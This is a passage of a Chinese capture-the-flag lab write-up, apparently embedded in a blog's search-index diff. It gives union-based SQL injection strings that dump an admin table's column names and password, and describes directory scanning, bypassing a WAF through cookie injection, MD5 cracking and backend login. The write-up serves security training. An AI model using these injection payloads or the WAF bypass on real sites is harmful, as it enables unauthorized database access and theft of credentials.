+<p>回显字段名为id</p>
+<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 1,1 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps63.jpg" alt="img"> </p>
+<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 2,1 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps64.jpg" alt="img"> </p>
+<p>回显password</p>
+<p>构造语句输出账号密码： ?id&#x3D;1 and 1&#x3D;2 union select 1,password from admin limit 0,1 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps65.jpg" alt="img"> </p>
+<p>回显hellohack 得到管理员账号和密码为：hellokack</p>
+<p>顺利得到flag</p>
+<ol start="4">
+<li>尤里的复仇2 信息收集1</li>
+</ol>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps66.jpg" alt="img"> </p>
+<p>用御剑进行扫描，flag在二级目录里</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps67.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps68.jpg" alt="img"> </p>
+<p>点击链接，得到flag</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps69.jpg" alt="img"> </p>
+<p>5.尤里的复仇 绕过WAF</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps70.jpg" alt="img"> </p>
+<p>随便点击一个新闻。在id&#x3D;171后面加一个引号’，测试一下是否有SQL注入。</p>
+<p>有弹框了，提示过滤了很多关键字。下一步考虑如何绕过这些关键字。</p>
+<p>因为网页做了waf过滤防护，这里我们考虑用cookie注入，可以进行绕过：</p>
+<p>这里我们使用一个小工具进行注入</p>
+<p>打开这款插件直接在value处填写注入参数即可然后按上面的键开始（value中的值需要注意的是空格用+表示）</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps71.jpg" alt="img"> </p>
+<p>出现账号和密码：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps72.jpg" alt="img"> </p>
+<p>将密码md5解密：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps73.jpg" alt="img"> </p>
+<p>用御剑进行扫描，获得后台地址：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps74.jpg" alt="img"> </p>
+<p>输入之前获得的用户名和密码：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps75.jpg" alt="img"> </p>
+<p>成功拿到flag:</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps76.jpg" alt="img"> </p>
 ]]></content>
   </entry>
 </search>
